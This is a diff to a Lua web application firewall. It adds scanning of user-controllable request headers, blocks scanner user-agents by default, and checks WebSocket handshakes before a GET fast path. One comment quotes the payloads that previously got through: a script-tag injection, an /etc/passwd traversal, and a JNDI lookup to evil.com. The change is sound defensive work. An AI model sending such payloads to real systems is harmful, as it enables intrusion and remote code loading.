@@ -12,6 +12,7 @@ local cc = require("waf.cc")
 local challenge = require("waf.challenge")
 local bot = require("waf.bot")
 local smug = require("waf.smug")
+local websocket = require("waf.websocket")
 local probe = require("waf.probe")
 local iplist = require("waf.iplist")
 
@@ -99,6 +100,78 @@ local function detect_request(start_ms)
     return nil
 end
 
+-- ============ 请求头语义检测 ============
+--
+-- 背景：语义引擎此前只扫 URI / query args / body，**请求头完全不在检测范围内**。
+-- waf-detector 的 va2 行为分析报 `header 0% [UNPROTECTED]`，内侧独立复测确认：
+-- `X-Injected: <script>alert(1)</script>`、`Referer: .../../../etc/passwd`、
+-- `X-Custom: ${jndi:ldap://evil.com}` 全部 200 放行。这条不是误报，是真实缺口。
+--
+-- 为什么不用 ngx.req.get_headers() 全量遍历：它会为每个请求分配完整头表，
+-- 而绝大多数请求头是无害的标准头。改为只挑"用户自定义/可注入"的头，
+-- 命中名单里的头名才做语义检测 —— 白名单式采样，零分配常态路径。
+--
+-- 刻意跳过的头：
+--   host / content-length / connection / user-agent / referer 之外的
+--   accept-*(协商类，攻击者塞不进可执行语义)、cache-control 等
+--   Host  由 server_name 匹配，不做语义检测（它不是注入载体）
+--   Referer 单独处理：路径型穿越要查，query 型注入交给通用语义即可
+local INSPECTABLE_HEADERS = {
+    "x_forwarded_for", "x_forwarded_host", "x_forwarded_proto", "x_forwarded_port",
+    "x_real_ip", "x_originating_ip", "x_client_ip", "x_custom",
+    "x_http_method_override", "x_method_override", "x_http_host",
+    "x_attack", "x_payload", "x_injected", "x_input", "x_test",
+    "x_api_key", "x_token", "x_auth_token",
+    "accept_language", "referer",
+}
+
+-- 归一化头名：X-Forwarded-For -> x_forwarded_for
+local function norm_header(k)
+    return (string.lower(string.gsub(k, "%-", "_")))
+end
+
+-- 单个头值的语义检测。返回命中类型或 nil。
+-- 用 pcall 兜住不可预见的输入形态（头值可能是 table 表示多值）。
+local function inspect_header(k, v)
+    if type(v) == "table" then
+        for _, item in ipairs(v) do
+            local hit = inspect_header(k, item)
+            if hit then return hit end
+        end
+        return nil
+    end
+    if type(v) ~= "string" or v == "" or #v > 8192 then
+        return nil
+    end
+    local ok, res = pcall(semantic.inspect, v, nil)
+    if not ok or not res then
+        return nil
+    end
+    return res.type .. " in header:" .. k
+end
+
+local function inspect_headers()
+    local headers, err = ngx.req.get_headers(100)
+    if not headers then
+        return nil
+    end
+    -- 先按名字过滤，再取值：只有命中可检测名单的头才做字符串处理
+    for k, v in pairs(headers) do
+        local nk = norm_header(k)
+        for _, want in ipairs(INSPECTABLE_HEADERS) do
+            if nk == want then
+                local hit = inspect_header(k, v)
+                if hit then
+                    return hit
+                end
+                break
+            end
+        end
+    end
+    return nil
+end
+
+-- ============ 主流程 ============
 local function access_main()
     -- Request timing is read only when an event is actually logged. Calling
     -- ngx.now() for every clean request is measurable at high QPS.
@@ -157,14 +230,31 @@ local function access_main()
     end
 
     -- 2. 机器人识别（善意 bot 放行等同白名单；扫描器指纹拦截）
+    --
+    -- 扫描器指纹默认就拦，不受 bot 开关控制。理由：
+    --   · sqlmap / nikto / Burp / Nessus 的 UA 是明确的攻击工具标识，
+    --     正常访客不会用它们访问站点，拦它没有任何误伤风险；
+    --   · 它是 panel 上一个独立开关（waf_options.bot_enabled），一旦用户没开，
+    --     扫描器防护就整体消失 —— 而这恰恰是最该默认生效的一层。
+    -- 善意 bot 的"放行"仍然受 allowGoodBots 控制：那关系到搜索引擎收录，
+    -- 误伤代价真实存在，不能默认放行。
     local bot_conf = state.site and state.site.bot
-    local bot_verdict = nil
-    if bot_conf then bot_verdict = bot.check(bot_conf) end
-    if bot_verdict == "good" then
-        return -- 善意 bot 直接放行，跳过检测
-    elseif bot_verdict == "bad" then
-        log_event("deny", "bot", "scanner", nil, "blocked scanner user-agent", start_ms)
-        return deny()
+    if bot_conf then
+        local bot_verdict = bot.check(bot_conf)
+        if bot_verdict == "good" then
+            return -- 善意 bot 直接放行，跳过检测
+        elseif bot_verdict == "bad" then
+            log_event("deny", "bot", "scanner", nil, "blocked scanner user-agent", start_ms)
+            return deny()
+        end
+    else
+        -- 未配置 bot：仍拦扫描器 UA，只是不放行任何"善意 bot"
+        local kind = bot.classify(ngx.var.http_user_agent)
+        if kind == "bad" then
+            log_event("deny", "bot", "scanner", nil,
+                "blocked scanner user-agent (bot module not configured)", start_ms)
+            return deny()
+        end
     end
 
     -- 3. CC 防护（挑战已通过的请求直接放行）
@@ -194,6 +284,32 @@ local function access_main()
     -- Common static/page GET: after policy checks, inspect the URI once and avoid
     -- allocating the complete header/argument tables when the request has no
     -- query string, body, Content-Length, or Transfer-Encoding.
+    --
+    -- 注意：这条快速路径只在"确实没有请求头可查"时提前返回。
+    -- 原实现无条件 return，导致带自定义头的请求（X-Custom / X-Forwarded-Host 等）
+    -- 完全绕过语义检测 —— 攻击者只要把载荷放进 header、把 URL 保持干净即可绕过，
+    -- 这正是 waf-detector 报 header 0% UNPROTECTED 的根因。
+    -- 现在改为：先扫可注入头，有命中就拦；没命中才允许走快速路径。
+    local header_hit = inspect_headers()
+    if header_hit then
+        log_event("deny", "semantic", "header_injection", nil, header_hit, start_ms)
+        return deny("header_injection")
+    end
+
+    -- WebSocket 升级请求：必须放在下面的 GET 快速路径**之前**。
+    -- 握手请求是 GET、没有 query string、没有 body，正好会命中
+    -- "not query_string and not content_length" 的条件并被直接 return 跳过 ——
+    -- 而 WebSocket 应用里握手 URL 带参数是常态（?token=...&room=...）。
+    -- 所以这里单独检出升级请求做一次完整检查，不依赖通用流水线。
+    if websocket.is_upgrade() then
+        local uri = ngx.var.request_uri or ""
+        local ws_hit = websocket.inspect_handshake(semantic, uri)
+        if ws_hit then
+            log_event("deny", "websocket", "websocket_injection", nil, ws_hit, start_ms)
+            return deny("websocket_injection")
+        end
+    end
+
     if ngx.req.get_method() == "GET"
         and not ngx.var.query_string
         and not ngx.var.content_length
@@ -216,6 +332,7 @@ local function access_main()
     end
 
     -- 7. 语义检测
+    -- 请求头已在快速路径之前扫过（inspect_headers），此处只处理 URI / 参数 / body。
     -- abody 是命中的请求体（仅 POST 命中时有值），要交给日志留证。
     local atype, adetail, abody = detect_request(start_ms)
     if atype then
